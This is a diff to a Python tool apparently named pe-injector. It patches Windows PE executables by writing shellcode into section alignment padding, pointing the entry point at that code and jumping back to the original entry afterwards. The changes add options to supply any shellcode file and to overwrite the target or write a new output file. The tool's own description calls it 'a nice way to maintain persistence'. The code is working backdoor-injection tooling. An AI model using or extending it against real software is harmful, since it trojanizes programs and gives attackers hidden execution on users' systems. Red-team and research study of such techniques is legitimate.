@@ -1,6 +1,7 @@
 from pefile import PE
 from struct import pack
 from sys import argv, exit
+from optparse import OptionParser
 
 # note, shellcode used should clean up after itself so pusha/popa instructions can be used to
 # restore register values to their original state, no stack smashing!
@@ -31,20 +32,20 @@ def changeEntryPoint(pe, new_addr):
 
 
 def getSectionPermissions(section):
-	''' return a dictionary with the permissions of a given section '''
+    ''' return a dictionary with the permissions of a given section '''
 
-	IMAGE_SCN_MEM_EXECUTE = 0x20000000 # The section can be executed as code.
-	IMAGE_SCN_MEM_READ    = 0x40000000 # The section can be read.
-	IMAGE_SCN_MEM_WRITE   = 0x80000000 # The section can be written to.
+    IMAGE_SCN_MEM_EXECUTE = 0x20000000 # The section can be executed as code.
+    IMAGE_SCN_MEM_READ    = 0x40000000 # The section can be read.
+    IMAGE_SCN_MEM_WRITE   = 0x80000000 # The section can be written to.
 
     r,w,x = False, False, False
     characteristics = section.Characteristics
-    
-    if characteristics & 0x20000000:
+
+    if characteristics & IMAGE_SCN_MEM_EXECUTE:
         x = True
-    if characteristics & 0x40000000:
+    if characteristics & IMAGE_SCN_MEM_READ:
         r = True
-    if characteristics & 0x80000000:
+    if characteristics & IMAGE_SCN_MEM_WRITE:
         w = True
     
     return {'read':r, 'write':w, 'exec':x}
@@ -72,13 +73,13 @@ def getEPDetails(pe):
 	permissions = getSectionPermissions(section)
 	return (end_offset, end_offset_aligned, padding, permissions)
 
-def injectPE(filename, shellcode):
+def injectPE(filename, shellcode, output_file):
 	pe = PE(filename)
 	original_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
 	(end_offset, end_offset_aligned, padding, permissions) = getEPDetails(pe)
 
 	# check permissions
-	print '[*] Permissions for entry point\'s section : %s' % (','.join(permissions.keys()))
+	print '[*] Permissions for entry point\'s section :', permissions.items()
 	if permissions['exec'] == False:
 		print '[!] Entry point is not executable! Wtf? Exiting!'
 		exit(1)
@@ -106,23 +107,62 @@ def injectPE(filename, shellcode):
 	changeEntryPoint(pe, pe.get_rva_from_offset(sc_start_offset))
 	raw_data = pe.write()
 	jmp_distance = original_entry_point - pe.get_rva_from_offset(sc_end_offset)
+
 	# fix the shellcode to save register contents and jmp to original entry after completion
 	shellcode = fixShellcode(shellcode, jmp_distance)
 	raw_data = insertShellcode(raw_data, sc_start_offset, shellcode)
+
 	# write the new file
-	new_file = open(r'C:\Users\nomnom\utdcsg\malware\calc5.exe', 'wb')
+	pe.close() # close the 'opened' PE first
+	new_file = open(output_file, 'wb')
 	new_file.write(raw_data)
 	new_file.close()
 	print '[*] New file created :)'
 
-def usage():
-	print 'Usage: %s [executable]\n' % argv[0]
-	exit(1)
+def parseCommandLine(argv):
+	''' Parse command line options. Fill in correct values where defaults are used. '''
+
+	# must overwrite the format_epilog function to get our examples printed correctly
+	class MyParser(OptionParser):
+		def format_epilog(self, formatter):
+			return self.epilog
+
+	examples  = "\nExamples:\n"
+	examples += 'python pe-injector C:\\...\\program.exe\n'
+	examples += 'python pe-injector -s C:\\...\\my_shellcode.bin C:\\...\\program.exe\n'
+	examples += 'python pe-injector -s C:\\...\\my_shellcode.bin -o C:\\...\\program2.exe C:\\...\\program.exe\n'
+
+	parser = MyParser(epilog=examples)
+	parser.set_description('Inject shellcode into extra file alignment padding of a PE and change the entry point to point to the shellcode. On execution, the shellcode will be executed, then return control flow to the original entry point of the program. Perhaps a nice way to maintain persistence? Check out the README for full details.')
+	parser.add_option('-s', action='store', dest='shellcode_file', help='File with desired shellcode. Default is msfpayload x86 message box', metavar='shellcode')
+	parser.add_option('-o', action='store', dest='output_file', help='Output file. Default is to overwrite the target executable', metavar='out_file')
+	options, args = parser.parse_args(argv)
+
+	# a target executable must be specified
+	if len(args) < 2:
+		parser.print_help()
+		exit(1)
+
+	# if no shellcode file is specified, use the sample shellcode
+	if not options.shellcode_file:
+		shellcode = sample_shellcode
+	else:
+		shellcode = open(options.shellcode_file, 'rb').read()
+	
+	# if no new executable is specified, we overwrite the existing one
+	if not options.output_file:
+		options.output_file = args[-1]
+
+	return (args[-1], shellcode, options.output_file)
+
 
 if __name__ == '__main__':
 
-	if len(argv) != 2:
-		usage()
+	(executable, shellcode, output_file) = parseCommandLine(argv)
+	print '[*] PE-Injector invoked with arguments :'
+	print '  [+] Target executable :', executable
+	print '  [+] Output File       :', output_file
+	print '  [+] Shellcode         :', repr(shellcode), '\n'
 
-	injectPE(argv[1], sample_shellcode)
+	injectPE(executable, shellcode, output_file)
 
